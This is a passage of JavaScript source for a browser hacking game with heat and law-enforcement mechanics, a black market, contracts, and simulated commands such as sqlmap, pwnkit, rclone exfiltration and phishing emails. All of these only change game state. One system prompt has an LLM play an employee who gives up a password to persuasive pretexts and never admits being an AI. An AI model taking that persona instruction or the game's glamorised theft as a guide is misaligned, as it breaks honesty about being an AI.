      // HOT (50-74%): BOTNET RAIDS — random C2 node killed
      if (curHeat >= 50 && curBotnet.length > 0 && Math.random() < 0.12) {
        const targetNode = curBotnet[Math.floor(Math.random() * curBotnet.length)];
        setBotnet(prev => {
          if (!prev.includes(targetNode)) return prev;
          return prev.filter(ip => ip !== targetNode);
        });
        setWorld(prev => {
          const nodeName = prev[targetNode]?.org?.orgName || targetNode;
          setTerminal(p => [...p, { type: 'out', text: `\n[ALERT] Blue Team forensics seized C2 beacon on ${nodeName} (${targetNode}).\n[-] Node removed from botnet. ${curBotnet.length - 1} nodes remaining.`, isNew: true }]);
          return prev;
        });
      }

      // CRITICAL (75-89%): PROXY CHAIN TARGETED — random hop burned
      if (curHeat >= 75 && curProxies.length > 0 && Math.random() < 0.08) {
        const burnedProxy = curProxies[Math.floor(Math.random() * curProxies.length)];
        setProxies(prev => prev.filter(ip => ip !== burnedProxy));
        setBotnet(prev => prev.filter(ip => ip !== burnedProxy));
        setWorld(prev => {
          const nodeName = prev[burnedProxy]?.org?.orgName || burnedProxy;
          const nw = { ...prev }; delete nw[burnedProxy];
          setTerminal(p => [...p, { type: 'out', text: `\n[!!!] LAW ENFORCEMENT INTERDICTION [!!!]\n[-] Proxy tunnel through ${nodeName} (${burnedProxy}) seized by cyber task force.\n[-] Hop destroyed. Proxy chain degraded.`, isNew: true }]);
          return nw;
        });
      }

      // MANHUNT (90-100%): FORCED DISCONNECT + RAPID DAMAGE
      if (curHeat >= 90) {
        // Forced disconnect if inside a node
        if (Math.random() < 0.15) {
          setIsInside(prev => {
            if (prev) {
              setTargetIP(null); setCurrentDir('~'); setPrivilege('local');
              setTerminal(p => [...p, { type: 'out', text: `\n[!!!] EMERGENCY DISCONNECT [!!!]\n[-] NSA TAO injected RST packets into your session. Connection killed.\n[-] They know where you are. Lower your heat NOW.`, isNew: true }]);
            }
            return false;
          });
        }
        // Accelerated botnet destruction
        if (curBotnet.length > 0 && Math.random() < 0.20) {
          const killCount = Math.min(Math.floor(Math.random() * 2) + 1, curBotnet.length);
          const killed = curBotnet.slice(0, killCount);
          setBotnet(prev => prev.filter(ip => !killed.includes(ip)));
          setProxies(prev => prev.filter(ip => !killed.includes(ip)));
          setTerminal(prev => [...prev, { type: 'out', text: `\n[!!!] COORDINATED TAKEDOWN: ${killCount} botnet node${killCount > 1 ? 's' : ''} seized simultaneously.\n[-] Global law enforcement is dismantling your network.`, isNew: true }]);
        }
      }

      // NATURAL HEAT DECAY — slow cooldown when not doing anything loud
      if (curHeat > 0 && curHeat < 90) {
        setHeat(h => Math.max(h - 1, 0));
      } else if (curHeat >= 90) {
        // Manhunt decay is slower — 50% chance per tick
        if (Math.random() < 0.5) setHeat(h => Math.max(h - 1, 0));
      }

    }, 10000); // Tick every 10 seconds

    return () => clearInterval(wantedTimer);
  }, [screen]);

  const handleBuy = (item, cost) => {
    if (walletFrozen && item !== 'ClearLogs') {
      setTerminal(prev => [...prev, { type: 'out', text: `[-] WALLET FROZEN: Transaction channels blocked by law enforcement.\n[*] Bribe SOC Insider is still available to reduce heat.`, isNew: true }]);
      return;
    }
    if (item !== 'ClearLogs' && inventory.includes(item)) return;
    if (money >= cost) {
      setMoney(m => m - cost);
      if (item === 'ClearLogs') setHeat(h => Math.max(h - 50, 0));
      else setInventory(inv => [...inv, item]);
    }
  };

  // ─── HARDWARE MARKET HANDLERS ─────────────────────────────
  const openHardwareMarket = () => {
    const newBtc = generateBTCPrice(btcIndex);
    setBtcIndex(newBtc);
    setHwMarketData(generateUnifiedMarket(currentRegion, newBtc, reputation));
    setScreen('hardware');
  };

  const handleHwBuy = (partId, price) => {
    if (walletFrozen) return;
    if (money < price) return;
    setMoney(m => m - price);
    
    // This adds the part to your "Bag" so it shows up in the "Inventory" list
    setPartsBag(bag => [...bag, partId]); 
    
    setHwMarketData(prev => {
      if (!prev) return prev;
      const stock = prev.stock.map(s =>
        s.partId === partId ? { ...s, qty: Math.max(0, s.qty - 1) } : s
      );
      return { ...prev, stock };
    });
  };

  const handleHwSell = (partId) => {
    const sellP = getSellPrice(partId, hwMarketData?.stock || []);
    // Remove from partsBag first, then from rig if installed
    const bagIdx = partsBag.indexOf(partId);
    if (bagIdx >= 0) {
      setPartsBag(bag => { const n = [...bag]; n.splice(bagIdx, 1); return n; });
    } else {
      // Must be installed — uninstall first
      const part = PARTS_BY_ID[partId];
      if (part) setRig(r => ({ ...r, [part.slot]: null }));
    }
    setMoney(m => m + sellP);
  };

  const handleHwInstall = (partId) => {
    const part = PARTS_BY_ID[partId];
    if (!part) return;
    const slot = part.slot;
    const currentPart = rig[slot];
    // Swap: move current part to bag if slot occupied
    if (currentPart) {
      setPartsBag(bag => [...bag, currentPart]);
    }
    // Remove from bag and install
    const bagIdx = partsBag.indexOf(partId);
    if (bagIdx >= 0) {
      setPartsBag(bag => { const n = [...bag]; n.splice(bagIdx, 1); return n; });
    }
    setRig(r => ({ ...r, [slot]: partId }));
  };

  const handleHwUninstall = (slot) => {
    const partId = rig[slot];
    if (!partId) return;
    setRig(r => ({ ...r, [slot]: null }));
    setPartsBag(bag => [...bag, partId]);
  };

  const handleBuyAndInstall = (partId, price) => {
    if (walletFrozen || money < price) return;
    const part = PARTS_BY_ID[partId];
    if (!part) return;
    setMoney(m => m - price);
    const slot = part.slot;
    const currentPart = rig[slot];
    if (currentPart) setPartsBag(bag => [...bag, currentPart]);
    setRig(r => ({ ...r, [slot]: partId }));
    setHwMarketData(prev => {
      if (!prev) return prev;
      return { ...prev, stock: prev.stock.map(s => s.partId === partId ? { ...s, qty: Math.max(0, s.qty - 1) } : s) };
    });
  };

  const handleBuySW = (partId, price) => {
    if (walletFrozen) return;
    if (money < price) return;
    const part = PARTS_BY_ID[partId];
    if (!part) return;
    if (!part.repeatable && softwareOwned.includes(partId)) return;
    setMoney(m => m - price);
    // Repeatable items apply effect immediately, non-repeatable go to inventory
    if (part.repeatable) {
      if (part.stats.effect === 'heat_minus_50') setHeat(h => Math.max(h - 50, 0));
      // Other repeatable effects can be added here
    } else {
      setSoftwareOwned(prev => [...prev, partId]);
      // Map to old inventory system for backward compat
      const effectMap = {
        'sw_crypter': 'Crypter', 'sw_nse': 'Scanner', 'sw_dpi': 'Wireshark',
        'sw_proxy': 'Overclock', 'sw_tor': 'TorRelay', 'sw_vpn': 'VPN',
        'sw_rootkit': 'Rootkit', 'sw_ai': 'AIAssist',
      };
      if (effectMap[partId]) setInventory(inv => [...inv, effectMap[partId]]);
    }
    // Reduce stock
    setHwMarketData(prev => {
      if (!prev) return prev;
      return { ...prev, stock: prev.stock.map(s => s.partId === partId ? { ...s, qty: Math.max(0, s.qty - 1) } : s) };
    });
  };

  const handleBuyCommodity = (itemKey, qty) => {
    if (walletFrozen) return;
    const price = hwMarketData?.commodityPrices?.[itemKey] || 0;
    const cost = price * qty;
    if (money >= cost) {
      setMoney(m => m - cost);
      setStash(s => ({ ...s, [itemKey]: (s[itemKey] || 0) + qty }));
    }
  };

  const handleSellCommodity = (itemKey, qty) => {
    const currentQty = stash[itemKey] || 0;
    if (currentQty < qty) return;
    const price = hwMarketData?.commodityPrices?.[itemKey] || 0;
    setMoney(m => m + price * qty);
    setStash(s => ({ ...s, [itemKey]: s[itemKey] - qty }));
  };

  const handleMarketTrade = (action, itemKey, qty) => {
    if (action === 'buy') {
        if (walletFrozen) return; // UI should show this, but guard here too
        const priceMult = getHeatPriceMult(heat);
        const inflatedPrice = Math.ceil(marketPrices[itemKey] * priceMult);
        const cost = inflatedPrice * qty;
        if (money >= cost) {
            setMoney(m => m - cost);
            setStash(s => ({ ...s, [itemKey]: (s[itemKey] || 0) + qty }));
        }
    } else if (action === 'sell') {
        const currentQty = stash[itemKey] || 0;
        if (currentQty >= qty) {
            const revenue = marketPrices[itemKey] * qty;
            setMoney(m => m + revenue);
            setStash(s => ({ ...s, [itemKey]: s[itemKey] - qty }));
        }
    }
  };

  const acceptContract = (id) => {
    const contract = contracts.find(c => c.id === id);
    if (!contract || contract.completed) return;
    const activated = { ...contract, active: true, startTime: Date.now() };
    setContracts(prev => prev.map(c => c.id === id ? activated : c));
    setActiveContract(activated);
    setScreen('game');
    setTerminal(prev => [...prev, { type: 'out', text: `[FIXER] Contract ${id} accepted.\n[*] Target: ${activated.targetName} (${activated.targetIP})\n[*] Time limit: ${activated.timeLimit}s | Max heat: ${activated.heatCap}%\n[*] Reward: ₿${activated.reward.toLocaleString()} + ${activated.repReward} REP`, isNew: true }]);
  };
const completeContractAndRemove = (id) => {
    // 1. Remove the contract from the board
    setContracts(prev => prev.filter(c => c.id !== id));
    
    // 2. Clear it from the active state
    if (activeContract?.id === id) {
      setActiveContract(null);
    }
  };
  const selectNodeFromMap = (ip) => {
    const node = world[ip]; if (!node) return;
    const port = node.port || 22; const svc = node.svc || 'ssh'; const exp = node.exp || 'hydra';
    let out = `Starting Nmap 7.93...\nNmap scan report for ${ip} (${node.name || node.org?.orgName || 'Unknown'})\nHost is up (0.01s latency).\n\nPORT     STATE SERVICE\n${port}/tcp   open  ${svc}\n`;
    if (node.org?.employees?.length) {
      out += `\n[*] OSINT: ${node.org.employees.length} employee records found via LinkedIn scrape.`;
      node.org.employees.forEach(emp => { out += `\n    ${emp.name} <${emp.email}@${ip}> — ${emp.role}`; });
    }
    if (exp === 'hydra') out += `\n\n[!] VULN: Weak SSH Credentials → 'hydra ${ip}'`;
    if (exp === 'sqlmap') out += `\n\n[!] VULN: SQL Injection → 'sqlmap ${ip}'`;
    if (exp === 'msfconsole') out += `\n\n[!] VULN: Unpatched SMB → 'msfconsole ${ip}'`;
    if (exp === 'curl') out += `\n\n[!] VULN: LFI via HTTP → 'curl ${ip}'`;
    setTerminal(prev => [...prev.map(t => ({ ...t, isNew: false })), { type: 'in', text: `nmap ${ip}`, dir: currentDir, remote: isInside, isNew: false }, { type: 'out', text: out, isNew: true }]);
    // On mobile: close map and show target detail in touch UI
    if (isMobile) {
      setMapExpanded(false);
      setMobileSelectedTarget(ip);
    }
  };

  const resolvePath = (path, current) => {
    if (!path) return current;
    if (path.startsWith('/')) return path;
    return current === '/' ? `/${path}` : `${current}/${path}`;
  };

  const sendChatToGemini = async (userMessage) => {
    setIsProcessing(true);
    const updatedHistory = [...chatHistory, { role: 'user', parts: [{ text: userMessage }] }];
    setChatHistory(updatedHistory);
    const targetIPStr = chatTarget.split('@')[1];
    const node = world[targetIPStr];
    const emp = node?.org?.employees?.find(e => chatTarget.startsWith(e.email));
    const persona = emp?.personality || "tired, paranoid, and easily annoyed";
    const empName = emp?.name || "Unknown Admin";
    const empRole = emp?.role || "IT Staff";
    const orgName = node?.org?.orgName || "the company";
    const password = emp?.password || "admin123";

   try {
      const system = `You are ${empName}, ${empRole} at ${orgName}. Your personality: ${persona}. A stranger is messaging you — they may be a hacker trying to spearphish you. DO NOT easily give up credentials. If the user provides a clever pretext that specifically exploits your personality trait, you will eventually reveal the password: '${password}'. Keep responses under 3 sentences. Stay in character. Never break character or mention you're an AI.`;
      
      // Flatten the chat history so it works across all AI APIs (Groq, Anthropic, etc)
      const prompt = updatedHistory.map(h => `${h.role === 'user' ? 'Hacker' : empName}: ${h.parts[0].text}`).join('\n');

      const aiText = await generateDirectorText(prompt, system);
      
      setChatHistory([...updatedHistory, { role: 'model', parts: [{ text: aiText }] }]);
      setTerminal(prev => [...prev, { type: 'out', text: `[${empName}]: ${aiText}`, isNew: true, isChat: true }]);
    } catch (error) { 
      setTerminal(prev => [...prev, { type: 'out', text: `[-] CONNECTION ERROR: ${error.message}`, isNew: true }]); 
    }
    setIsProcessing(false);
  };

  const handleCommand = async (e, directCmd) => {
    if (!directCmd && (e.key !== 'Enter' || isProcessing)) return;
    if (e?.preventDefault) e.preventDefault();
    let trimmed = directCmd || input.trim();
    if (!trimmed) return;

    setTerminal(prev => [...prev.map(t => ({ ...t, isNew: false })), { type: 'in', text: trimmed, dir: isChatting ? `chat@${chatTarget}` : currentDir, remote: isInside || isChatting, isNew: false }]);
    setInput('');

    if (isChatting) {
      if (trimmed.toLowerCase() === 'exit') {
        setIsChatting(false);
        setTerminal(prev => [...prev, { type: 'out', text: '[*] Channel closed.', isNew: true }]);
        return;
      }
      await sendChatToGemini(trimmed);
      return;
    }

    if (trimmed.toLowerCase().startsWith('cd..')) trimmed = trimmed.toLowerCase().replace('cd..', 'cd ..');
    const args = trimmed.split(/\s+/);
    const cmd = args[0].toLowerCase();
    const arg1 = args[1] || null;
    let output = '';

    const fs = isInside ? world[targetIP]?.files : world.local.files;
    const contents = isInside ? world[targetIP]?.contents : world.local.contents;

    // Active Blue Team Check
    if (isInside && trace > 70 && Math.random() < 0.4) {
      setIsProcessing(true);
      const nodeName = world[targetIP]?.org?.orgName || targetIP;
      const blueTeamMsg = await invokeBlueTeamAI(apiKey, trimmed, nodeName, trace, heat);
      setTrace(t => Math.min(t + 20, 100));
      setTerminal(prev => [...prev, { type: 'out', text: `\n[!!!] ACTIVE THREAT RESPONSE INITIATED [!!!]\n${blueTeamMsg}\n[!] Trace +20%. Connection unstable.\n`, isNew: true }]);
      setIsProcessing(false);
    }

    const executeExploit = (toolName, targetIPArg) => {
      if (isInside) return `[-] Disconnect from current session first.`;
      if (!targetIPArg) return `[-] Usage: ${toolName} <target_ip>`;
      const node = world[targetIPArg];
      if (!node) return `[-] Target ${targetIPArg} not found.`;
      
      if (node.isHoneypot) {
        playFailure();
        playHeatSpike();
        setHeat(h => Math.min(h + 40, 100));
        setWorld(prev => { const nw = { ...prev }; delete nw[targetIPArg]; return nw; });
        trackHoneypot(); trackExploit(false);

        // --- NEW: HONEYPOT CONTRACT FAIL LOGIC ---
        let contractFailMsg = '';
        if (activeContract && activeContract.active && activeContract.objectives?.some(o => o.ip === targetIPArg)) {
          completeContractAndRemove(activeContract.id);
          trackContract(false);
          contractFailMsg = `\n\n[FIXER] CONTRACT BURNT.\n[-] Target was a federal trap. Op is compromised. I'm scrubbing my tracks, you should do the same.`;
        }

        return `[!!!] HONEYPOT TRIGGERED [!!!]\n[-] Blue Team trap. IP logged by SOC. HEAT +40%${contractFailMsg}`;
      }
      
      if (node.exp !== toolName) {
        playFailure();
        trackExploit(false);
        return `[-] ${toolName}: Exploit failed. Wrong attack vector.`;
      }
      
      playSuccess();
      setIsInside(true); setTargetIP(targetIPArg); setCurrentDir('/'); setPrivilege('www-data');
      let startTrace = Math.floor(heat / 3);
      if (node.sec === 'high') startTrace += 20;
      trackExploit(true);
      const orgName = node.org?.orgName || 'target';

      if (activeContract && activeContract.active && activeContract.objectives?.some(o => o.ip === targetIPArg) && activeContract.isAmbush) {
        escalateBlueTeam(targetIPArg, 85);
        setHeat(h => Math.min(h + 30, 100));
        setTrace(Math.min(startTrace + 25, 100));
        return `[!!!] CONTRACT COMPROMISED. BLUE TEAM AMBUSH [!!!]\n[-] The fixer sold you out. IDS signatures instantly matched your payload.\n[-] Trace timer accelerating. Heat +30%.\n[*] Exploiting ${toolName} against ${orgName}...\n[+] LOW PRIVILEGE SHELL (www-data) ESTABLISHED. Get out alive.`;
      }

      setTrace(Math.min(startTrace, 100));
      return `[*] Exploiting ${toolName} against ${orgName}...\n[+] Payload delivered. Reverse shell caught.\n[+] LOW PRIVILEGE SHELL (www-data) on ${targetIPArg}`;
    };
    if (activeContract && activeContract.active) {
        if (activeContract.forbidden_tools && activeContract.forbidden_tools.includes(cmd)) {
            setTerminal(prev => [...prev, { type: 'out', text: `[-] CONTRACT BREACH IMMINENT.\n[-] Fixer expressly forbade using '${cmd}' on this op. Access denied.`, isNew: true }]);
            setIsProcessing(false);
            return;
        }
    }
const verifyContract = (ip, objectiveType) => {
    let msg = '';
    const currentContract = contracts.find(c => c.active && !c.completed);
    if (currentContract) {
      const isMatch = currentContract.objectives?.some(o => o.ip === ip && o.type === objectiveType);
      if (isMatch) {
        const timeTaken = (Date.now() - currentContract.startTime) / 1000;
        const rewardVal = currentContract.reward || 0;
        const repVal = currentContract.repReward || 0;
        if (timeTaken <= (currentContract.timeLimit || 9999) && heat <= (currentContract.heatCap || 100)) {
          setMoney(m => m + rewardVal);
          setReputation(r => r + repVal);
          completeContractAndRemove(currentContract.id); trackContract(true);
          msg = `\n\n[FIXER] CONTRACT FULFILLED.\n[+] BONUS: ₿${rewardVal.toLocaleString()} + ${repVal} REP`;
        } else {
          completeContractAndRemove(currentContract.id); trackContract(false);
          msg = `\n\n[FIXER] CONTRACT FAILED. Time Limit or Heat Cap exceeded.`;
        }
      }
    }
    return msg;
  };

  const COMMANDS = { // <--- Your existing commands object starts here
  
      rclone: async () => {
        if (!isInside) return "[-] rclone: Must be executed on a remote host.";
        if (privilege !== 'root') return "[-] rclone: Root access required to bypass DLP (Data Loss Prevention) sensors.";
        
        const node = world[targetIP];
        const isHighVal = node?.sec === 'high' || node?.sec === 'elite';
        
        if (!isHighVal) return "[-] rclone: Target architecture does not contain sufficient proprietary data. Target a High or Elite node.";

        const exfilKey = `rclone_${targetIP}`;
        if (looted.includes(exfilKey)) return "[-] rclone: Target filesystem already drained of valuable intel.";

        let totalSize, heatPerTick, loops, delay, reqProxies;
        if (gameMode === 'arcade') {
            totalSize = 400; heatPerTick = 10; loops = 3; delay = 800; reqProxies = 0;
        } else if (gameMode === 'operator') {
            totalSize = 1500; heatPerTick = 20; loops = 5; delay = 1500; reqProxies = 2;
        } else {
            totalSize = 800; heatPerTick = 15; loops = 4; delay = 1200; reqProxies = 0;
        }

        if (gameMode === 'operator' && proxies.length < reqProxies) {
            return `[-] rclone: OPERATOR MODE ENFORCEMENT.\n[-] Exfiltration of ${totalSize}GB requires at least ${reqProxies} active proxy hops to mask data streams. Deploy proxychains first.`;
        }

        setIsProcessing(true);
        setTerminal(prev => [...prev, { type: 'out', text: `[*] Configuring rclone v1.63.1...\n[*] Bypassing DLP sensors...\n[*] Establishing encrypted tunnel to offshore drop server...`, isNew: false }]);
        
        await new Promise(r => setTimeout(r, 2000));
        
        let transferred = 0;
        for (let i = 0; i < loops; i++) {
          transferred += Math.floor(totalSize / loops);
          setHeat(h => Math.min(h + heatPerTick, 100));
          if (gameMode === 'operator') setTrace(t => Math.min(t + 10, 100));
          setTerminal(prev => [...prev, { type: 'out', text: `[*] Transferred: ${transferred} GB / ${totalSize} GB...`, isNew: false }]);
          await new Promise(r => setTimeout(r, delay));
        }
        
        playExfil();
        setLooted(prev => [...prev, exfilKey]);
        setConsumables(prev => ({ ...prev, intel: (prev.intel || 0) + (gameMode === 'operator' ? 2 : 1) }));
        
        setIsProcessing(false);
        return `[+] EXFILTRATION COMPLETE: ${totalSize} GB of proprietary R&D secured.\n[!] Massive network anomaly detected. Incident logged by SOC.\n[+] 'Corporate Intel' added to local stash. Type 'exit' and use 'fence intel' to sell it.`;
      },

      fence: async () => {
        if (isInside) return "[-] fence: Must be run securely from KALI-GATEWAY. Type 'exit' first.";
        if (!arg1 || arg1 !== 'intel') return "[-] Usage: fence intel\n[*] Sells exfiltrated Corporate Intel on the Darknet.";
        
        const intelCount = consumables.intel || 0;
        if (intelCount <= 0) return "[-] fence: No Corporate Intel in local stash. Use 'rclone' on a High/Elite target to acquire some.";

        setIsProcessing(true);
        setTerminal(prev => [...prev, { type: 'out', text: `[*] Accessing Genesis Market over TOR...\n[*] Uploading sample data proofs...\n[*] Negotiating with nation-state buyers...`, isNew: false }]);
        
        const waitTime = gameMode === 'arcade' ? 1000 : (gameMode === 'operator' ? 4000 : 2500);
        await new Promise(r => setTimeout(r, waitTime));
        
        const mult = getRewardMult(gameMode);
        const baseValue = Math.floor(Math.random() * 20000 + 15000); 
        
        let payout = Math.floor(baseValue * mult * intelCount);
        let darknetFee = 0;

        if (gameMode === 'operator') {
            darknetFee = Math.floor(payout * 0.15);
            payout -= darknetFee;
        } else if (gameMode === 'arcade') {
            payout = Math.floor(payout * 1.2);
        }
        
        setConsumables(prev => ({ ...prev, intel: 0 }));
        setMoney(m => m + payout);
        playSuccess();
        
        setIsProcessing(false);
        let out = `[$$$] TRANSACTION SECURED.\n[+] Sold ${intelCount}x Corporate Intel packages.`;
        if (gameMode === 'operator') out += `\n[-] Genesis Market Escrow withheld ₿${darknetFee.toLocaleString()} (15% laundering fee).`;
        if (gameMode === 'arcade') out += `\n[+] Arcade Mode 20% Profit Bonus applied!`;
        out += `\n[+] ₿${payout.toLocaleString()} tumbled and routed to your local wallet.`;
        
        return out;
      },
      sudo: async () => {
        if (arg1 === 'devmode') { setDevMode(prev => !prev); return `[!] DEV MODE ${!devMode ? 'ENABLED' : 'DISABLED'}. Godmode protocols active.`; }
        return `bash: sudo: permission denied`;
      },
      'dev.money': async () => {
        if (!devMode) return `bash: dev.money: command not found`;
        const amount = parseInt(arg1) || 5000; setMoney(m => m + amount);
        return `[DEV] Injected ₿${amount.toLocaleString()}.`;
      },
      'dev.item': async () => {
        if (!devMode) return `bash: dev.item: command not found`;
        if (!arg1) return `[DEV] Usage: dev.item <id>\n[DEV] Valid IDs: Crypter, Scanner, Overclock, Wireshark, TorRelay, ClearLogs, ATXCase, NetCard, Cooling, CPU, GPU, RGB`;
        
        const itemMap = { 
            'crypter':'Crypter', 'scanner':'Scanner', 'overclock':'Overclock', 'wireshark':'Wireshark', 
            'torrelay':'TorRelay', 'clearlogs':'ClearLogs', 'atxcase':'ATXCase', 'netcard':'NetCard', 
            'cooling':'Cooling', 'cpu':'CPU', 'gpu':'GPU', 'rgb':'RGB' 
        };
        const actualItem = itemMap[arg1.toLowerCase()] || arg1;
        
        if (inventory.includes(actualItem)) return `[DEV] You already have ${actualItem}.`;
        
        setInventory(inv => [...inv, actualItem]); 
        return `[DEV] Added '${actualItem}' to inventory. Dashboard should update immediately.`;
      },
      'dev.score': async () => {
        if (!devMode) return `bash: dev.score: command not found`;
        const newScore = parseInt(arg1) || 0;
        setDirector(prev => ({ ...prev, skillScore: newScore, modifiers: computeDifficultyModifiers(newScore, inventory) }));
        return `[DEV] AI Director Skill Score forced to ${newScore}. Modifiers recalculated.`;
      },
      'dev.reveal': async () => {
        if (!devMode) return `bash: dev.reveal: command not found`;
        setWorld(prev => { const nw = { ...prev }; Object.keys(nw).forEach(ip => { if (nw[ip]) nw[ip].isHidden = false; }); return nw; });
        return `[DEV] Fog of war lifted. All hidden grid nodes revealed.`;
      },

      hydra: async () => executeExploit('hydra', arg1),
      sqlmap: async () => executeExploit('sqlmap', arg1),
      msfconsole: async () => executeExploit('msfconsole', arg1),
      curl: async () => executeExploit('curl', arg1),

      pwnkit: async () => {
        if (!isInside) return '[-] Must be on a remote host.';
        if (privilege === 'root') return '[-] Already root.';
        playRootShell();
        setPrivilege('root'); setTrace(t => Math.min(t + 15, 100));
        escalateBlueTeam(targetIP, 15); trackRoot();
        const node = world[targetIP];
        const blueAlert = node?.blueTeam?.alertLevel || 0;
        let out = `[*] Executing CVE-2021-4034...\n[+] UID 0 (root). Trace +15%`;
        if (blueAlert > 40) out += `\n\n[!] WARNING: Blue Team alert level HIGH on this node. They may be watching.`;
        return out;
      },

      spearphish: async () => {
        if (!arg1 || !arg1.includes('@')) return "[-] Usage: spearphish <email@ip>";
        if (isInside) return "[-] Disconnect from shell first.";
        const emailPart = arg1.split('@')[0];
        const ipPart = arg1.split('@')[1];
        const node = world[ipPart];
        const emp = node?.org?.employees?.find(e => e.email === emailPart);
        if (!emp) return `[-] Employee not found. Use nmap <ip> to discover employees.`;
        setIsChatting(true); setChatTarget(arg1); setChatHistory([]);
        return `[*] Connecting to ${emp.name} (${emp.role} at ${node.org.orgName})...\n[+] Channel open. Type your pretext, or 'exit' to close.\n[*] HINT: This person is ${emp.personality}`;
      },
      ssh: async () => {
  if (isInside) return "[-] ssh: Disconnect from current session first.";
  if (!arg1 || !args[2]) return "[-] Usage: ssh <email@ip> <password>";
  
  // 1. Prepare inputs (Trimming here handles the mobile space issue)
  const [userRaw, ipStr] = arg1.split('@');
  const user = userRaw ? userRaw.trim() : '';
  const pass = args.slice(2).join(' ').trim(); 
  
  if (!user || !ipStr) return "[-] Invalid target format. Use: ssh <email>@<ip> <password>";
  
  const node = world[ipStr];
  if (!node) return `[-] ssh: connect to host ${ipStr} port 22: Connection refused`;
  
  // 2. Find employee (Robust matching for email or username)
  const emp = node.org?.employees?.find(e => 
    e.email.trim().toLowerCase() === user.toLowerCase() || 
    e.email.split('.')[0].trim().toLowerCase() === user.toLowerCase()
  );

  if (!emp) return `[-] Access denied. User '${user}' does not exist on this server.`;
  
  // 3. Start Visual Feedback
  setIsProcessing(true);
  setTerminal(prev => [...prev, { 
    type: 'out', 
    text: `[*] Initializing SSH client...\n[*] Connecting to ${ipStr}:22...\n${user}@${ipStr}'s password: ${'*'.repeat(pass.length)}`, 
    isNew: false 
  }]);
  
  await new Promise(r => setTimeout(r, 1500));
  
  // 4. Final Password Check (Trimming stored pass to match trimmed input)
  if (emp.password.trim() !== pass) {
    setHeat(h => Math.min(h + 5, 100));
    playFailure();
    setIsProcessing(false);
    return `[-] Permission denied (publickey,password).\n[!] Failed login attempt logged by target IDS. Heat +5%`;
  }
  
  // 5. Success Logic
  playSuccess();
  setIsInside(true);
  setTargetIP(ipStr);
  setCurrentDir('/');
  
  // Privilege Check
  const role = emp.role.toLowerCase();
  const isAdmin = role.includes('admin') || role.includes('director') || role.includes('chief') || role.includes('dba');
  
  setPrivilege(isAdmin ? 'root' : 'user');
  setTrace(0); // Zero trace for valid credentials
  setIsProcessing(false);
  
  return `[+] Authentication successful.\n[+] Established secure shell as '${emp.name}' (${emp.role}).\n[*] WARNING: Valid credentials bypass initial trace, but actions are still logged.`;
},

      sendmail: async () => {
        if (!isInside) return "[-] sendmail: You must be inside a target network to spoof internal emails.";
        if (!arg1 || !args[2]) return "[-] Usage: sendmail -to <employee_email> -attach <payload>\n[*] Example: sendmail -to sarah.chen -attach payload.bin";

        const hasTo = args.indexOf('-to');
        const hasAttach = args.indexOf('-attach');

        if (hasTo === -1 || hasAttach === -1) return "[-] sendmail: Invalid syntax. Use -to and -attach flags.";

        const targetUser = args[hasTo + 1];
        const payload = args[hasAttach + 1];

        const node = world[targetIP];
        const emp = node.org?.employees?.find(e => e.email === targetUser || e.email.includes(targetUser.split('.')[0]));

        if (!emp) return `[-] Employee '${targetUser}' not found in corporate directory.`;

        setIsProcessing(true);
        setTerminal(prev => [...prev, { type: 'out', text: `[*] Accessing internal SMTP relay...\n[*] Spoofing sender as 'IT Support'...\n[*] Attaching ${payload}...\n[*] Sending email to ${emp.name}...`, isNew: false }]);
        await new Promise(r => setTimeout(r, 2500));

        const isIT = emp.role.toLowerCase().includes('admin') || emp.role.toLowerCase().includes('sec') || emp.role.toLowerCase().includes('dev');
        let phishChance = isIT ? 0.25 : 0.80; 

        if (Math.random() < phishChance) {
           playSuccess();
           setBotnet(prev => {
             if (!prev.includes(targetIP)) return [...prev, targetIP];
             return prev;
           });
           setPrivilege('root');
           setHeat(h => Math.min(h + 5, 100));
           setIsProcessing(false);
           return `[+] SOCIAL ENGINEERING SUCCESSFUL!\n[+] ${emp.name} (${emp.role}) opened the attachment.\n[+] ${payload} executed seamlessly in the background.\n[+] Privileges escalated to ROOT. Node added to botnet.`;
        } else {
           playFailure();
           setHeat(h => Math.min(h + 20, 100));
           escalateBlueTeam(targetIP, 30);
           setIsProcessing(false);
           return `[-] PHISHING FAILED.\n[-] ${emp.name} recognized the attack and forwarded the email to the SOC.\n[!] Incident logged. Blue Team alert level massively increased. Heat +20%.`;
        }
      },
      contracts: async () => {
        if (isInside) return "[-] Exit current session to access contract board.";
        setScreen('contracts'); return '';
      },

      travel: async () => {
        if (isInside) return `[-] Cannot travel while connected to a remote host.`;
        if (!arg1) return `[-] Usage: travel <region>\n[*] Regions: ${REGIONS.join(', ')}`;
        
        const targetRegion = arg1.toLowerCase();
        if (!REGIONS.includes(targetRegion)) return `[-] Unknown region. Use: ${REGIONS.join(', ')}`;
        if (targetRegion === currentRegion) return `[-] You are already in the ${currentRegion} subnet.`;
        
        setIsProcessing(true);
        setTerminal(prev => [...prev, { type: 'out', text: `[*] Bouncing Tor nodes... routing gateway to ${targetRegion.toUpperCase()}...`, isNew: false }]);
        await new Promise(r => setTimeout(r, 1500));
        
        // --- THE FIX ---
        // 1. We stop calling setWorld(DEFAULT_WORLD) here so the nodes stay in state.
        // 2. We just change the active region view.
        setCurrentRegion(targetRegion);
        setMarketPrices(generateMarketPrices(currentRegion));
        
        let encounterText = '';
        if (Math.random() < 0.15) {
            const heatAdd = Math.floor(Math.random() * 15) + 5;
            setHeat(h => Math.min(h + heatAdd, 100));
            playHeatSpike();
            encounterText = `\n[!!!] INTERCEPTED: Interpol sniffing traffic on border gateway. Heat +${heatAdd}%`;
        }

        setIsProcessing(false);
        return `[+] Gateway rerouted to ${targetRegion.toUpperCase()}.${encounterText}\n[*] Connection stable. Global subnets persistent.`;
      },
      
      market: async () => {
  if (isInside) return `[-] Cannot access market while inside a target.`;
  setScreen('market');
        if (walletFrozen) return `[!] WALLET FROZEN — limited trading. Reduce heat below 75%.`;
        return '';
      },

      buy: async () => {
        if (isInside) return `[-] Cannot trade while inside a target.`;
        if (walletFrozen) return `[-] WALLET FROZEN: Transaction channels blocked by law enforcement.\n[*] Reduce heat below 75% to restore access. Try 'wipe' on rooted nodes or Bribe SOC Insider.`;
        if (!arg1 || !args[2]) return `[-] Usage: buy <item> <qty>\n[*] Items: cc_dumps, botnets, exploits, zerodays`;
        const itemKey = arg1.toLowerCase();
        const qty = parseInt(args[2]);
        if (!COMMODITIES[itemKey]) return `[-] Unknown commodity: ${itemKey}`;
        if (isNaN(qty) || qty <= 0) return `[-] Invalid quantity.`;
        
        const priceMult = getHeatPriceMult(heat);
        const inflatedPrice = Math.ceil(marketPrices[itemKey] * priceMult);
